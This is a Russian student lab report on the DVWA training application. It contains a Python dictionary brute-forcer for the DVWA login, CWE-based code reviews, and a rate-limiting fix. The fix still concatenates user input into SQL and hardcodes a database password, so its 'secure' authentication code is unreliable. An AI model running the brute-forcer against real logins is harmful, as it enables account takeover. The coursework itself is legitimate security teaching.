# Практическая работа №3
<h3> Задание №1. Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local (Можно использовать официальный ресурс или виртуальную машину Web Security Dojo)</h3>

<p>Выполнено на языке программирования Python с использованием библиотеки requests. В качестве источника паролей был выбран готовый словарь с наиболее часто встречающимися паролями(common-passwords.txt). Разработанный алгоритм читает все пароли из файла и каждый из них поочередно подставляет в тело HTTP GET запроса. При успешном входе пользователь видит надпись "Welcome to the password protected area". Она и является определяющим фактором для разработанного решения</p>

    passwords = []

    with open("common-passwords.txt", "r", encoding='utf-8') as file:
        for password in file.readlines():
            if '\n' in password:
                passwords.append(password[:-1])
                continue

            passwords.append(password)
        
    cookies = {'PHPSESSID':'dha64hulcvldr08koooh0a8iqt', 'security': 'low'}

    for password in passwords:
        response = requests.get(url=f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&Login=Login#', cookies=cookies)
        if 'Welcome to the password protected area' in response.text:
            print(f'Password: {password}')
            break

<h3>Задание №2. Проанализировать код и сделать кодревью, указав слабые места. 
Слабость уязвимого кода необходимо указать с использованием метрики 
CWE (база данных cwe.mitre.org)</h3>

    <?php
        if( isset( $_GET[ 'Login' ] ) ) {
        // Get username
        $user = $_GET[ 'username' ];
        // Get password
        $pass = $_GET[ 'password' ];
        $pass = md5( $pass );
        // Check the database
        $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . 
            ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = 
            mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
        if( $result && mysqli_num_rows( $result ) == 1 ) {
                // Get users details
                $row    = mysqli_fetch_assoc( $result );
                $avatar = $row["avatar"];
                // Login successful
                $html .= "<p>Welcome to the password protected area {$user}</p>";
                $html .= "<img src=\"{$avatar}\" />";
        }
        else {
                // Login failed
                $html .= "<pre><br />Username and/or password incorrect.</pre>";
        }
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }?>

<ol>
    <li>CWE-89. Возможно использование SQL инъекции при определении запроса $query. Как вариант решения проблемы - использование параметризированных запросов</li>
    <li>CWE-79. Не защищенный вывод. В выражениях вида $html .= "какой-то текст и разметка..." возникает уязвимость к XSS атакам - злоумыщленник может внедрить свой JavaScript код</li>
    <li>CWE-522. Пароли хранятся в недостаточно надежном виде - используется md5.</li>
    <li>CWE-20. Отсутствие валидации ввода. Необходимо обрабатывать введенные данные перед их использованием</li>
    <li>CWE-307. Отсутствие защиты от неудачных попыток входа. Предоставляет возможность, например, перебора паролей</li>
	<li>CWE-759. Хранение паролей без соли.  Лучше для каждого пользователя определять уникальное значение(соль), добавлять его к паролю и хэшировать. Таким образом, даже для пользователей с одинаковыми паролями хэши будут разными</li>
	<li>CWE-807. Использование ненадежных входных данных при принятии решения о безопасности</li>

</ol>

<h3>Задание №3. Разработать свою систему авторизации на любом языке, 
исключающий взможность подбора паролей разработнным 
переборщиком паролей в задании 1. Возможно исправление авторизации 
из dvwa.local. Требование - Система авторизации должна использовать запросы GET с 
параметрами, аналогичными из задания bruteforce dvwa
</h3>
<p>Для решения данной задачи в базе данных создана таблица "visits", содержащая в себе количество попыток входа для конкретного IP адреса, исходя из соображений, что после трех неуспешных попыток входа IP адрес не имеет доступ к ресурсу. При успешном же входе количество попыток обнуляется(если оно не привысило 3шт.), в противном же случае увеличивается</p>
<p>Для начала создадим соответствующую таблицу</p>

<pre>CREATE TABLE visits(
    id INT AUTO_INCREMENT,
    ip VARCHAR(16),
    count INT,
    PRIMARY KEY(id)
)
</pre>
<p>Теперь реализуем блокировку</p>
<p>
	
	if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
	
	$ip = $_SERVER["REMOTE_ADDR"];
	
	$visits_q = "SELECT count FROM visits WHERE ip = '$ip';";
	$connection = new mysqli("localhost", "dvwa", "p@ssw0rd", "dvwa");
	
	$visits_count = 0;

	if($qres = $connection->query($visits_q)){
		$rows_count = $qres->num_rows;
		if ($rows_count == 0) {
			$insert_q = "INSERT INTO visits(ip, count) VALUES('$ip', 1);";
			$connection->query($insert_q);
			$visits_count = 1;
		}
		else {
			foreach($qres as $row){
				$visits_count = $row["count"];
				break;
			}
		}
	}

	if ($visits_count > 3) {
		$html .= "<p>Too many requests!</p>";
		//die();
	}
	else{
		if( $result && mysqli_num_rows( $result ) == 1 ) {
			// Get users details
			$row    = mysqli_fetch_assoc( $result );
			$avatar = $row["avatar"];
	
			// Login successful
			$html .= "<p>Welcome to the password protected area {$user}</p>";
			$html .= "<img src=\"{$avatar}\" />";
			$visits_count = 0;
		}
		else {
			//Login failed
			$html .= "<pre><br />Username and/or password incorrect.</pre>";
			$visits_count = $visits_count + 1;
		}
	
		
		$update_q = "UPDATE visits SET count = $visits_count WHERE ip = '$ip'";
		$connection->query($update_q);
	
		((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
	
	}

	}

</p>
<h1>Практическая работа №4</h1>
<h3>Задание №1. 1.Необходимо найти участок кода, содержащий инъекцию SQL кода в задании Blind Sql Injection на сайте dvwa.local с использованием статического анализатора кода (Можно использовать официальный ресурс или виртуальную машину Web Security Dojo)</h3>
Выполнено в WEB-версии sonarcloud.io
<pre>
if( isset( $_GET[ 'Submit' ] ) ) {
        // Get input
        $id = $_GET[ 'id' ];

        // Check database
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

        // Get results
        $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
        if( $num > 0 ) {
                // Feedback for end user
                $html .= '<pre>User ID exists in the database.</pre>';
        }
        else {
                // User wasn't found, so the page wasn't!
                header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

                // Feedback for end user
                $html .= '<pre>User ID is MISSING from the database.</pre>';
        }

        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
</pre>
<p>Результат статического анализа доступен по ссылке</p>
<pre>
https://github.com/fokypoky/BruteforceDVWA/blob/main/analyze-result.png
</pre>

<h3>Задание №2. Проанализировать код и сделать кодревью, указав слабые места</h3>
<ol>
<li>CWE-89. Код подвержен SQL инъекциям из-за того, что значение переменной id не было защищено</li>
<li>CWE-20. Отсутствует проверка на корректность ввода данных, что может привести к уязвимостям</li>
<li>CWE-311. Данные, передаваемые через URL, могут быть перехвачены, так как они не зашифрованы</li>
<li>CWE-862. Отсутствует проверка прав доступа к базе данных</li>
<li>CWE-807. Программа полагается на ненадежные входные данные (GET параметры)</li>
<li>CWE-307. Отсутствие защиты от неудачных попыток входа. Предоставляет возможность, например, перебора паролей</li>
<li>CWE-79. Не защищенный вывод. В выражениях вида $html .= "какой-то текст и разметка..." возникает уязвимость к XSS атакам - злоумыщленник может внедрить свой JavaScript код</li>
</ol>
